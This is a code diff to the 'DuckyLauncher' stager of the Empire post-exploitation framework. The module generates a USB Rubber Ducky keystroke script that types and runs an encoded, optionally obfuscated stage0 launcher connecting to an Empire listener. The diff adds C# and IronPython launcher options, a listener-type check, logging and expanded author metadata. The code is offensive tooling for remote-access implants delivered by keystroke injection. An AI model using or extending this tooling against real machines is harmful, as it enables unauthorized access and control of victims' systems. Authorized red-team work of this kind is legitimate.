@@ -1,16 +1,27 @@
 from __future__ import print_function
 
+import logging
 from builtins import object
 
-from empire.server.common import helpers
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             "Name": "DuckyLauncher",
-            "Author": ["@harmj0y", "@kisasondi"],
+            "Authors": [
+                {
+                    "Name": "Will Schroeder",
+                    "Handle": "@harmj0y",
+                    "Link": "https://twitter.com/harmj0y",
+                },
+                {
+                    "Name": "",
+                    "Handle": "@kisasondi",
+                    "Link": "",
+                },
+            ],
             "Description": "Generates a ducky script that runes a one-liner stage0 launcher for Empire.",
             "Comments": [""],
         }
@@ -28,7 +39,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
             "Interpreter": {
@@ -88,7 +99,6 @@ class Stager(object):
                 self.options[option]["Value"] = value
 
     def generate(self):
-
         # extract all of our options
         language = self.options["Language"]["Value"]
         interpreter = self.options["Interpreter"]["Value"]
@@ -104,24 +114,41 @@ class Stager(object):
         if obfuscate.lower() == "true":
             obfuscate_script = True
 
-        # generate the launcher code
-        module_name = self.mainMenu.listeners.activeListeners[listener_name][
-            "moduleName"
-        ]
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listenerName=listener_name,
-            language=language,
-            encode=True,
-            obfuscate=obfuscate_script,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-        )
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                encode=True,
+                listener_name=listener_name,
+            )
+        elif language == "powershell":
+            # generate the launcher code
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language=language,
+                encode=True,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+            )
 
         if launcher == "" or interpreter == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("[!] Error in launcher command generation.")
             return ""
         else:
             enc = launcher.split(" ")[-1]
